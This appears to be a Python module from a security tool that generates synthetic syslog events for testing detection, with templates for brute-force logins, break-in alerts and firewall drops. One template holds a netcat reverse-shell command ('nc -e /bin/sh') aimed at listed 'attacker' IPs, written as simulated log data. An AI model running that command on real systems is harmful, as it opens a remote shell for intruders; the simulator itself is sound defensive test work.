"""
SENTINEX v2.0 — Syslog Simulator
Generates synthetic syslog events from various security sources
"""
import random
import uuid
from datetime import datetime, timedelta
from typing import List, Dict, Any


SYSLOG_TEMPLATES = [
    {"facility": "auth", "severity": "warning", "msg": "Failed password for root from {ip} port {port} ssh2", "tags": ["brute_force", "T1110"]},
    {"facility": "auth", "severity": "alert", "msg": "POSSIBLE BREAK-IN ATTEMPT from {ip}", "tags": ["intrusion", "T1078"]},
    {"facility": "kernel", "severity": "critical", "msg": "segfault at 0x0 ip 0x7f{rand} sp 0x7fff{rand} error 4", "tags": ["exploit", "T1203"]},
    {"facility": "daemon", "severity": "warning", "msg": "suspicious process /tmp/.x11/nc -e /bin/sh {ip} {port}", "tags": ["reverse_shell", "T1059"]},
    {"facility": "auth", "severity": "info", "msg": "Accepted publickey for admin from {ip} port {port} ssh2", "tags": ["ssh_login"]},
    {"facility": "firewall", "severity": "warning", "msg": "DROP TCP {ip}:{port} -> 10.0.1.50:443 (SYN)", "tags": ["blocked", "firewall"]},
]


def generate_syslog_events(count: int = 100) -> List[Dict[str, Any]]:
    """Generate synthetic syslog events."""
    events = []
    base_time = datetime.utcnow()
    attacker_ips = ["185.220.101.47", "45.33.32.156", "103.15.28.91"]

    for i in range(count):
        template = random.choice(SYSLOG_TEMPLATES)
        ip = random.choice(attacker_ips)
        port = random.randint(1024, 65535)

        events.append({
            "event_id": str(uuid.uuid4()),
            "timestamp": (base_time + timedelta(seconds=i * random.uniform(0.5, 5))).isoformat(),
            "event_type": "syslog",
            "src_ip": ip,
            "dst_ip": "10.0.1.50",
            "dst_port": port,
            "facility": template["facility"],
            "syslog_severity": template["severity"],
            "message": template["msg"].format(ip=ip, port=port, rand=uuid.uuid4().hex[:8]),
            "source_feed": "wazuh",
            "tags": template["tags"],
            "failed_logins": random.randint(0, 50) if "brute_force" in template["tags"] else 0,
        })

    return events
